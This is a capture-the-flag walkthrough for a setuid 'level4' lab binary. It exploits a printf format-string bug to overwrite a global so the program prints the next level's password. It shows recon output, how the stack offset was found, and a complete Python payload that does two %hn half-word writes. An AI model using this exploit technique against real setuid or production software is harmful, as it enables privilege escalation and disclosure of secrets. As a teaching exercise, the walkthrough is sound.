level4 - walkthrough
====================

Target: /home/user/level4/level4   (setuid + setgid level5)
Goal:   read /home/user/level5/.pass

1. Recon (objdump -d level4)
     n():   fgets(buf,0x200,stdin); p(buf);
            if (m == 0x1025544) system("/bin/cat /home/user/level5/.pass");
     p(s):  printf(s);            ; <-- format string vulnerability
   Globals (objdump -t): m @ 0x08049810 (.bss).
   The system() string (gdb x/s 0x8048590) is
   "/bin/cat /home/user/level5/.pass" -- self-contained, no shell needed.

2. Goal
   Make the format string write 0x1025544 into m, then the program cats the
   flag for us.

3. Find our argument offset
     $ python -c 'print "AAAA" + ".%x"*15' | ./level4
     -> 0x41414141 appears as the 12th value => our buffer is at position 12.

4. Two-halves write (fast)
   0x1025544 as a single %n would print ~16 MB. Split into two %hn (short)
   writes, smaller value first so the running count only increases:
       low  half  0x5544 (21828) -> m   (0x08049810)
       high half  0x0102 (  258) -> m+2 (0x08049812)

   Buffer front holds three dwords so the count-bump between the two writes has
   a throwaway arg to consume:
       [ m+2 ][ "AAAA" ][ m ]      = positions 12, 13, 14
   Format body (all UNNUMBERED, so consumption is sequential):
       %8x * 10     consume positions 1..10   (each 32-bit value -> exactly 8)
       %166x        consume position 11        -> running count = 258
       %hn          position 12 = m+2          -> write 0x0102
       %21570x      position 13 = "AAAA"        -> running count = 21828
       %hn          position 14 = m             -> write 0x5544
   Result: m = 0x01025544 = 0x1025544.  (12 header bytes + 80 + 166 = 258; then
   + 21570 = 21828.)

5. Run
     $ python -c 'import sys,struct; m=0x08049810; \
         sys.stdout.write(struct.pack("<I",m+2)+"AAAA"+struct.pack("<I",m)+ \
         "%8x"*10+"%166x"+"%hn"+"%21570x"+"%hn"+"\n")' | ./level4
   The 21 KB of hex padding scrolls by, then the flag is printed.
   (Capture it with:  ... | ./level4 | grep -aoE '[0-9a-f]{64}')

